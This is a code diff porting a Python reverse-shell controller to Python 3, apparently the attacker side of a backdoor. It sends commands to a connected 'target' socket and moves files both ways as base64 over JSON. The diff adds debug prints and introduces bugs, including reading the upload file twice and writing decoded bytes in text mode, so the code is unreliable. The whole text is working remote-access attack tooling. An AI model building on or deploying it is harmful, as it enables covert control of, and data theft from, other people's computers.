@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import sys
 import json
@@ -12,11 +12,13 @@ def s_send(data):
     target.send(json_data.encode("utf-8"))
 
 def s_recv():
-    data = ""
+    json_data = ""
     while True:
         try:
-            data = data + target.recv(1024).decode("utf-8")
-            return json.loads(data)
+            json_data = json_data + target.recv(1024).decode("utf-8")
+            print(type(json_data))
+            encoded_data = json.loads(json_data)
+            return encoded_data
         except ValueError:
             continue
 
@@ -29,18 +31,19 @@ def shell():
         elif command[:2] == "cd" and len(command) > 1:
             continue
         elif command[:8] == "download":
-            with open(command[9:], "wb") as fout:
-                print(command[:8])
-                print(command[9:])
-                file_data = s_recv()
-                fout.write(base64.b64decode(file_data))
+            with open(command[9:], "w") as fout:
+                encoded_data = s_recv()
+                print(type(encoded_data))
+                data = base64.b64decode(encoded_data)
+                print(type(data))
+                fout.write(data)
         elif command[:6] == "upload":
             try:
-                with open(command[7:], "r") as fin:
+                with open(command[7:], "rb") as fin:
+                    print(type(base64.b64encode(fin.read())))
                     s_send(base64.b64encode(fin.read()))
             except:
                 print(colored("Upload Failed !!!", "red"))
-                s_send(base64.b64encode("Upload Failed !!!"))
         else:
             result = s_recv()
             print(result)
